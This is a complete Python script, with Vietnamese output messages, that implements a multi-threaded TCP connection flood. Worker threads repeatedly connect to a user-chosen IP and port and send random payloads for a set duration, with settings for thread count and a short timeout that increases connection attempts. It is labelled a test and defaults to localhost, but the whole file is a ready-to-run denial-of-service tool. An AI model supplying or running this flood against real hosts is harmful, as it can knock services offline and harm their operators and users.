import argparse
import socket
import time
import os
import threading


def worker(target_ip: str, target_port: int, end_time: float, payload: bytes, connect_timeout: float, stats) -> None:
    local_sent = 0
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(connect_timeout)
                s.connect((target_ip, target_port))
                s.sendall(payload)
                local_sent += 1
        except Exception:
            continue
    stats.append(local_sent)


def tcp_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    payload_size: int = 512,
    workers: int = 10,
    connect_timeout: float = 0.05,
) -> None:
    payload = os.urandom(payload_size)
    end_time = time.time() + duration
    stats = []
    threads = []
    for _ in range(workers):
        t = threading.Thread(
            target=worker,
            args=(target_ip, target_port, end_time, payload, connect_timeout, stats),
            daemon=True,
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    total_sent = sum(stats)
    print(
        f"Đã gửi {total_sent} gói TCP (size={payload_size} bytes) "
        f"tới {target_ip}:{target_port} trong {duration:.1f}s "
        f"với {workers} luồng"
    )


def main():
    parser = argparse.ArgumentParser(description="TCP flood test (multi-thread, aggressive)")
    parser.add_argument("--target", default="127.0.0.1", help="IP đích")
    parser.add_argument("--port", type=int, default=80, help="Port đích")
    parser.add_argument("--duration", type=float, default=10.0, help="Thời gian chạy (giây)")
    parser.add_argument("--size", type=int, default=512, help="Kích thước payload mỗi gói (bytes)")
    parser.add_argument("--workers", type=int, default=10, help="Số luồng gửi song song")
    parser.add_argument(
        "--timeout",
        type=float,
        default=0.05,
        help="Timeout kết nối (giây) - giảm để thử nhiều kết nối hơn",
    )
    args = parser.parse_args()
    tcp_flood(args.target, args.port, args.duration, args.size, args.workers, args.timeout)


if __name__ == "__main__":
    main()

